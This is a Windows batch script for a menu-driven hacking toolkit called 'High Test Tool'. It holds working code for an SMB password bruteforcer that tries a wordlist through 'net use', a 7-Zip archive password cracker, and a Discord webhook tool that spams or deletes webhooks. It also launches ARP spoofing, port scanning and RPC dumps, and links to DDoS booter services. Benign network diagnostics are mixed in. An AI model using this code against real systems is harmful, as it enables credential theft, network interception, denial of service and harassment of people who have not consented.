@echo off
title High Test Tool - by FE4RR
reg add "HKCU\Console" /v "FaceName" /t REG_SZ /d "Consolas" /f >nul 2>&1
reg add "HKCU\Console" /v "FontSize" /t REG_DWORD /d 1048576 /f >nul 2>&1
mode con: cols=120 lines=30
chcp 65001 >nul
cd Programs

:menu
cls
type "%~dp0banner.txt"
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
echo.
echo.
echo                                                ╔═══════════════════════╗
echo                                                ║  [38;2;200;120;255m^<^<[0mA[38;2;200;120;255m^>^> [[0mDiscord[38;2;200;120;255m][0m      ║
echo                                                ║                       ║
echo                                                ║  [38;2;200;120;255m^<^<[0mB[38;2;200;120;255m^>^> [[0mGithub[38;2;200;120;255m][0m       ║
echo                                                ╚═══════════════════════╝
echo.
echo.
echo                ╔═══════════════════════╗       ╔═══════════════════════╗       ╔═══════════════════════╗
echo                ║[38;2;200;120;255m^<^<[0m1[38;2;200;120;255m^>^>  [[0mNetwork Tool[38;2;200;120;255m][0m  ║       ║[38;2;200;120;255m^<^<[0m6[38;2;200;120;255m^>^>  [[0mMac Trace[38;2;200;120;255m][0m     ║       ║[38;2;200;120;255m^<^<[0m11[38;2;200;120;255m^>^> [[0mSessionsploit[38;2;200;120;255m][0m ║
echo                ║                       ║       ║                       ║       ║                       ║
echo                ║[38;2;200;120;255m^<^<[0m2[38;2;200;120;255m^>^>  [[0mGeolocate[38;2;200;120;255m][0m     ║       ║[38;2;200;120;255m^<^<[0m7[38;2;200;120;255m^>^>  [[0mARP Spoof[38;2;200;120;255m][0m     ║       ║[38;2;200;120;255m^<^<[0m12[38;2;200;120;255m^>^> [[0mPhone Lookup[38;2;200;120;255m][0m  ║
echo                ║                       ║       ║                       ║       ║                       ║
echo                ║[38;2;200;120;255m^<^<[0m3[38;2;200;120;255m^>^>  [[0mTrace DNS[38;2;200;120;255m][0m     ║       ║[38;2;200;120;255m^<^<[0m8[38;2;200;120;255m^>^>  [[0mRPC Dump[38;2;200;120;255m][0m      ║       ║[38;2;200;120;255m^<^<[0m13[38;2;200;120;255m^>^> [[0mDC Manager[38;2;200;120;255m][0m    ║
echo                ║                       ║       ║                       ║       ║                       ║
echo                ║[38;2;200;120;255m^<^<[0m4[38;2;200;120;255m^>^>  [[0mPort Scan[38;2;200;120;255m][0m     ║       ║[38;2;200;120;255m^<^<[0m9[38;2;200;120;255m^>^>  [[0mBruteforcer[38;2;200;120;255m][0m   ║       ║[38;2;200;120;255m^<^<[0m14[38;2;200;120;255m^>^> [[0mReverse DNS[38;2;200;120;255m][0m   ║
echo                ║                       ║       ║                       ║       ║                       ║
echo                ║[38;2;200;120;255m^<^<[0m5[38;2;200;120;255m^>^>  [[0mDDos[38;2;200;120;255m][0m          ║       ║[38;2;200;120;255m^<^<[0m10[38;2;200;120;255m^>^> [[0mZipcracker[38;2;200;120;255m][0m    ║       ║[38;2;200;120;255m^<^<[0m15[38;2;200;120;255m^>^> [[0mNetScan[38;2;200;120;255m][0m       ║
echo                ╚═══════════════════════╝       ╚═══════════════════════╝       ╚═══════════════════════╝
echo.
set /p input= %BS%               [[38;2;200;120;255m^>[0m] Choice:
if /I "%input%" EQU "A" goto discord
if /I "%input%" EQU "B" goto github
if /I "%input%" EQU "1" goto networktool
if /I "%input%" EQU "2" goto geolocate
if /I "%input%" EQU "3" goto tracedns
if /I "%input%" EQU "4" goto portscan
if /I "%input%" EQU "5" goto ddos
if /I "%input%" EQU "6" goto Macaddr
if /I "%input%" EQU "7" goto arpspoof
if /I "%input%" EQU "8" goto rpcdump
if /I "%input%" EQU "9" goto bruteforce
if /I "%input%" EQU "10" goto zipcracker
if /I "%input%" EQU "11" start sessionsploit.exe
if /I "%input%" EQU "12" goto phonelookup
if /I "%input%" EQU "13" goto dcmanager
if /I "%input%" EQU "14" goto dns_tool
if /I "%input%" EQU "15" goto connections
cls
goto start

:github
start https://github.com/DogEaterFN
cls
goto start

:discord
start https://discord.gg/mvxJrvQKeg
cls
goto start

:networktool
echo                [38;2;200;120;255mLoading Network Information...[0m
:loop
ping -n 3 8.8.8.8>%temp%\ping.txt
for /f "tokens=4 delims==" %%a in ('type %temp%\ping.txt ^| find "Average"') do set ping=%%a
for /f "tokens=10 delims= " %%a in ('type %temp%\ping.txt ^| find "Lost"') do set ploss=%%a
for /f "tokens=2 delims= " %%a in ('netstat -e ^| find "Bytes"') do set rbytes=%%a
for /f "tokens=3 delims= " %%a in ('netstat -e ^| find "Bytes"') do set sbytes=%%a
cls
echo  [38;2;200;120;255m[[0mLatency[38;2;200;120;255m][0m
echo  [38;2;200;120;255m--------[0m
echo  [38;2;200;120;255m^<[0mPing[38;2;200;120;255m^> [[0m%ping%[38;2;200;120;255m][0m
echo  [38;2;200;120;255m^<[0mPacket Loss[38;2;200;120;255m^> [[0m%ploss%[38;2;200;120;255m][0m
echo  [38;2;200;120;255m^<[0mRecieved[38;2;200;120;255m^> [[0m%rbytes% Bytes[38;2;200;120;255m][0m
echo  [38;2;200;120;255m^<[0mSent[38;2;200;120;255m^> [[0m%sbytes% Bytes[38;2;200;120;255m][0m
goto loop
pause >nul
cls
goto menu

:rpcdump
cls
echo.
set /p ip=[38;2;200;120;255m[[0mEnter IP Address[38;2;200;120;255m] [0m
rpcdump %ip%
echo.
pause >nul
cls
goto menu

:Macaddr
cls
echo.
set /p ip=[38;2;200;120;255m[[0mEnter IP Address[38;2;200;120;255m] [0m
ping -w 1 %ip% >nul
for /f "tokens=2 delims= " %%a in ('arp -a ^| find "%ip%"') do set macaddr=%%a
for /f "usebackq delims=" %%I in (`powershell "\"%macaddr%\".toUpper()"`) do set "upper=%%~I"
cls
echo.
echo Mac Address: %upper%
echo.
pause >nul
cls
goto menu

:arpspoof
cls
echo.
set errorlevel=0
set /p ip=[38;2;200;120;255m[[0mEnter IP Address[38;2;200;120;255m] [0m
start cmd /c "mode 87, 10 && title Spoofing %ip%... && echo. && arpspoof.exe %ip%"
pause >nul
cls
goto menu

:ddos
cls
echo.
echo                ╔══════════════════════════════════════════════╗
echo                ║ [38;2;200;120;255m^<^<[0m1[38;2;200;120;255m^>^>  [[0mhttps://freestresser.so/[38;2;200;120;255m][0m            ║
echo                ║                                              ║
echo                ║ [38;2;200;120;255m^<^<[0m2[38;2;200;120;255m^>^>  [[0mhttps://hardstresser.com/[38;2;200;120;255m][0m           ║
echo                ║                                              ║
echo                ║ [38;2;200;120;255m^<^<[0m3[38;2;200;120;255m^>^>  [[0mhttps://stresser.net/[38;2;200;120;255m][0m               ║
echo                ║                                              ║
echo                ║ [38;2;200;120;255m^<^<[0m4[38;2;200;120;255m^>^>  [[0mhttps://str3ssed.co/[38;2;200;120;255m][0m                ║
echo                ║                                              ║
echo                ║ [38;2;200;120;255m^<^<[0m5[38;2;200;120;255m^>^>  [[0mhttps://projectdeltastress.com/[38;2;200;120;255m][0m     ║
echo                ║                                              ║
echo                ║ [38;2;200;120;255m^<^<[0m6[38;2;200;120;255m^>^>  [[0mBack[38;2;200;120;255m][0m                                ║
echo                ╚══════════════════════════════════════════════╝
echo.
set /p ddosinput=[[38;2;200;120;255m^>[0m]Choice:
if /I "%ddosinput%" EQU "1" start https://freestresser.so/
if /I "%ddosinput%" EQU "2" start https://hardstresser.com/
if /I "%ddosinput%" EQU "3" start https://stresser.net/
if /I "%ddosinput%" EQU "4" start https://str3ssed.co/
if /I "%ddosinput%" EQU "5" start https://projectdeltastress.com/
if /I "%ddosinput%" EQU "6" goto menu
pause <nul
cls
goto menu

:portscan
cls
set errorlevel=0
echo.
set /p ip=[38;2;200;120;255m[[0mIP Address[38;2;200;120;255m] [0m
set /p ports=[38;2;200;120;255m[[0mPorts[38;2;200;120;255m] [0m
start cmd /c "mode 40, 15 && title Scanning Ports... && PortScanner.exe hosts=%ip% ports=%ports%>>portscan.txt"
ping localhost -n 5 >nul
taskkill /im PortScanner.exe /f >nul 2>&1
echo.
type portscan.txt
echo.
ping localhost -n 1 >nul
del portscan.txt
pause >nul
cls
goto menu

:tracedns
cls
echo.
set /p ip=[38;2;200;120;255m[[0mIP Address[38;2;200;120;255m] [0m
cls
for /f "tokens=2 delims= " %%a in ('nslookup %ip% ^| find "Name"') do set dns=%%a
echo.
echo [38;2;200;120;255m[[0mDomain Name[38;2;200;120;255m][0m %dns%
echo.
pause >nul
cls
goto menu

:geolocate
cls
echo.
echo [38;2;200;120;255m[[0mIP Geolocation Lookup[38;2;200;120;255m][0m
echo.
set "ip_input="
set /p "ip_input=[38;2;200;120;255m[[0mEnter IP Address[38;2;200;120;255m] [0m"

if "!ip_input!"=="" (endlocal & goto menu)

echo  [38;2;200;120;255mContacting Database...[0m

set "ps_cmd=%temp%\run_geo.ps1"
set "data_out=%temp%\geo_out.txt"

(
echo $url = "http://ip-api.com/json/!ip_input!?fields=status,country,regionName,city,zip,isp,timezone,query"
echo try {
echo     $d = Invoke-RestMethod -Uri $url -Method Get
echo     if ($d.status -eq 'success'^) {
echo         "IP Address : $($d.query)", "Country    : $($d.country)", "Region     : $($d.regionName)", "City       : $($d.city)", "Zip Code   : $($d.zip)", "ISP        : $($d.isp)", "Timezone   : $($d.timezone)" ^| Out-File "%data_out%" -Encoding utf8
echo     } else { exit 1 }
echo } catch { exit 1 }
) > "%ps_cmd%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%ps_cmd%"

if %errorlevel% NEQ 0 (
    echo.
    echo [31mError: API Error or Invalid IP format.[0m
    del "%ps_cmd%" >nul 2>&1
    pause
    endlocal & goto menu
)

echo  [38;2;200;120;255m──────────────────────────────────────────────────────────────────[0m
if exist "%data_out%" (
    for /f "usebackq delims=" %%a in ("%data_out%") do (
        echo  [38;2;200;120;255m[+][0m [37m%%a[0m
    )
)
echo  [38;2;200;120;255m──────────────────────────────────────────────────────────────────[0m

del "%ps_cmd%" >nul 2>&1
del "%data_out%" >nul 2>&1
pause
endlocal
goto menu"

:bruteforce
cls
echo.
set /p ip=[38;2;200;120;255m[[0mEnter IP Address[38;2;200;120;255m] [0m
set /p user=[38;2;200;120;255m[[0mEnter Username[38;2;200;120;255m] [0m
set /p wordlist=[38;2;200;120;255m[[0mEnter Password List[38;2;200;120;255m] [0m

set wordlist=%wordlist:"=%

if not exist "%wordlist%" (
    echo [38;2;200;120;255mWordlist Not Found: "%wordlist%"[0m
    pause >nul
    cls
    goto menu
)

setlocal EnableDelayedExpansion
set /a count=1

for /f "usebackq delims=" %%a in ("%wordlist%") do (
    set "pass=%%a"
    call :attempt_smb
    if !errorlevel! EQU 0 goto success_smb
)
endlocal
echo [38;2;200;120;255mPassword Not Found[0m
pause >nul
cls
goto menu

:attempt_smb
echo [38;2;200;120;255m^<^<[0mATTEMPT !count![38;2;200;120;255m^>^>[0m [38;2;200;120;255m[[0m!pass![38;2;200;120;255m][0m
net use \\%ip% /user:%user% "!pass!" >nul 2>&1
set /a count=!count!+1
exit /b

:success_smb
echo.
echo [38;2;200;120;255m^<^<[0mPassword Found[38;2;200;120;255m^>^>[0m [38;2;200;120;255m[[0m!pass![38;2;200;120;255m][0m
net use \\%ip% /d /y >nul 2>&1
pause >nul
endlocal
cls
goto menu

:zipcracker
cls
if exist "C:\Program Files\7-Zip\7z.exe" (
    set "sevenzip=C:\Program Files\7-Zip\7z.exe"
) else if exist "C:\Program Files (x86)\7-Zip\7z.exe" (
    set "sevenzip=C:\Program Files (x86)\7-Zip\7z.exe"
) else (
    echo [38;2;200;120;255m7-Zip Not Installed[0m
    pause >nul
    cls
    goto menu
)

echo.
set /p archive=[38;2;200;120;255m[[0mEnter Archive Path[38;2;200;120;255m] [0m

set archive=%archive:"=%

if not exist "%archive%" (
    echo [38;2;200;120;255mArchive Not Found[0m
    pause >nul
    cls
    goto menu
)

set /p wordlist2=[38;2;200;120;255m[[0mEnter Password List[38;2;200;120;255m] [0m

set wordlist2=%wordlist2:"=%

if not exist "%wordlist2%" (
    echo [38;2;200;120;255mWordlist Not Found[0m
    pause >nul
    cls
    goto menu
)

echo [38;2;200;120;255mCracking...[0m
setlocal EnableDelayedExpansion
set /a count2=1
for /f "usebackq delims=" %%a in ("%wordlist2%") do (
    set "pass2=%%a"
    call :attempt_zip
    if !errorlevel! EQU 0 goto success_zip
)
endlocal
echo [38;2;200;120;255mPassword Not Found[0m
pause >nul
cls
goto menu

:attempt_zip
echo [38;2;200;120;255m^<^<[0mATTEMPT !count2![38;2;200;120;255m^>^>[0m [38;2;200;120;255m[[0m!pass2![38;2;200;120;255m][0m
"%sevenzip%" x -p"!pass2!" "%archive%" -o"cracked" -y >nul 2>&1
set /a count2=!count2!+1
exit /b

:success_zip
echo.
echo [38;2;200;120;255m^<^<[0mPassword Found[38;2;200;120;255m^>^>[0m [38;2;200;120;255m[[0m!pass2![38;2;200;120;255m][0m
pause >nul
endlocal
cls
goto menu

:phonelookup
cls
setlocal ENABLEDELAYEDEXPANSION
echo.

if exist "Phone-Number-Lookup.py" (
    echo  [38;2;200;120;255mLaunching Python Module for full data...[0m
    python Phone-Number-Lookup.py
    if !errorlevel! EQU 0 (
        endlocal
        goto menu
    )
)

set "phone="
set /p "phone=[38;2;200;120;255m[[0mEnter Number (Ex: +14155552671)[38;2;200;120;255m] [0m"

if "!phone!"=="" (
    endlocal
    goto menu
)

set "phone=!phone:"=!"
set "phone=!phone: =!"
set "phone=!phone:+=!"

echo  [38;2;200;120;255mContacting Backup Database...[0m

set "response=%temp%\phone_res.txt"
if exist "%response%" del /f /q "%response%" >nul 2>&1

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "try { ^
        $url = 'https://demo.numlookupapi.com/api/customer/number?number=!phone!'; ^
        $data = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 10 -ErrorAction Stop; ^
        $data | ConvertTo-Json | Out-File -FilePath '%response%' -Encoding utf8; ^
    } catch { ^
        Write-Host 'DNS/API Error: ' $_.Exception.Message -ForegroundColor Red; ^
        exit 1; ^
    }"

if %errorlevel% NEQ 0 (
    echo.
    echo [31mLookup Failed. Your DNS may be blocking the API.[0m
    echo [31mTry switching your DNS to Google (8.8.8.8) or Cloudflare (1.1.1.1).[0m
    pause
    endlocal
    goto menu
)

if exist "%response%" (
    echo [38;2;200;120;255m──────────────────────────────────────────────────────────────────[0m
    for /f "usebackq delims=" %%i in ("%response%") do (
        set "line=%%i"
        set "line=!line:{=!"
        set "line=!line:}=!"
        set "line=!line:"=!"
        for %%a in ("!line:,= !") do (
            for /f "tokens=1,2 delims=:" %%b in ("%%~a") do (
                set "key=%%b"
                set "val=%%c"
                if /i "!key!"=="valid" echo  [38;2;200;120;255m[+][0m Status       : !val!
                if /i "!key!"=="number" echo  [38;2;200;120;255m[+][0m Phone        : !val!
                if /i "!key!"=="country_name" echo  [38;2;200;120;255m[+][0m Country      : !val!
                if /i "!key!"=="carrier" echo  [38;2;200;120;255m[+][0m Operator     : !val!
                if /i "!key!"=="line_type" echo  [38;2;200;120;255m[+][0m Type Number  : !val!
            )
        )
    )
    echo [38;2;200;120;255m──────────────────────────────────────────────────────────────────[0m
    del "%response%" /f /q >nul 2>&1
)

pause
endlocal
goto menu

:dcmanager
cls
setlocal enabledelayedexpansion
echo.
set "hook_url="
set /p "hook_url=[38;2;200;120;255m[[0mWebhook URL[38;2;200;120;255m] [0m"
if "!hook_url!"=="" (endlocal & goto menu)

echo.
echo  [38;2;200;120;255m[1][0m Send Message
echo  [38;2;200;120;255m[2][0m Delete Webhook
echo  [38;2;200;120;255m[3][0m High-Speed Spam
echo.
set /p "w_choice=Select Option -> "

if "!w_choice!"=="1" goto wh_send
if "!w_choice!"=="2" goto wh_del
if "!w_choice!"=="3" goto wh_spam
goto menu

:wh_send
set /p "m_text=[38;2;200;120;255m[[0mMessage[38;2;200;120;255m] [0m"
powershell -NoProfile -Command "Invoke-RestMethod -Uri '!hook_url!' -Method Post -Body (@{content='!m_text!'} | ConvertTo-Json) -ContentType 'application/json'"
echo  [38;2;200;120;255m[+][0m Sent.
pause
goto menu

:wh_del
powershell -NoProfile -Command "Invoke-RestMethod -Uri '!hook_url!' -Method Delete"
echo  [38;2;200;120;255m[+][0m Deleted.
pause
goto menu

:wh_spam
set /p "s_text=[38;2;200;120;255m[[0mSpam Message[38;2;200;120;255m] [0m"
set /p "s_count=[38;2;200;120;255m[[0mAmount[38;2;200;120;255m] [0m"
echo  [38;2;200;120;255mLaunching...[0m
powershell -NoProfile -Command "for($i=1;$i -le !s_count!;$i++){ try{ Invoke-RestMethod -Uri '!hook_url!' -Method Post -Body (@{content='!s_text!'} | ConvertTo-Json) -ContentType 'application/json'; Write-Host 'Sent' $i; Start-Sleep -Milliseconds 400 }catch{ Write-Host 'Rate Limited!'; Start-Sleep -Seconds 1 } }"
pause
goto menu

:dns_tool
mode con: cols=120 lines=30
cls
echo.
set /p "domain=[38;2;200;120;255m[[0mEnter Domain (e.g. google.com)[38;2;200;120;255m] [0m"

echo  [38;2;200;120;255mResolving...[0m
nslookup %domain% | findstr "Address"

echo.
echo  [38;2;200;120;255mChecking HTTP Status...[0m
curl -I -s %domain% | findstr "Server Date Content-Type"
if errorlevel 1 echo  [31m[!] Could not retrieve headers.[0m

echo.
pause
goto menu

:connections
mode con: cols=120 lines=30
cls
echo.
echo  [38;2;200;120;255m[[0mActive Network Connections[0m]
echo  [38;2;200;120;255mProto  Local Address          Foreign Address        State[0m
echo  [38;2;200;120;255m──────────────────────────────────────────────────────────────────[0m

netstat -n | findstr "ESTABLISHED"

echo  [38;2;200;120;255m──────────────────────────────────────────────────────────────────[0m
echo  [38;2;200;120;255m[!] Displaying only ESTABLISHED connections.[0m
pause
goto menu